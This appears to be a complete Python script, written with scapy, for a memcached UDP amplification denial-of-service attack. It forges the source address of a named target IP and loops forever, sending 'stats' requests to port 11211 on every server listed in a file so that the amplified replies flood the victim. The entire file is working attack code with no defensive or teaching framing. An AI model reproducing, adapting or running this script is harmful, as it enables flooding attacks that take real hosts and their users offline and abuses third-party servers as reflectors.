#-- coding: utf8 --
#!/usr/bin/env python2
import sys, os, time
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout


power = 1
data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
target = "87.221.61.101"
targetport = 80
servers = open("servers.txt", 'r')
# Delete powered off servers

while True:
    for ip in servers.readlines():
        send(IP(src=target, dst='%s' % ip) / UDP(sport=targetport,dport=11211)/Raw(load=data), count=power)
        print(ip)
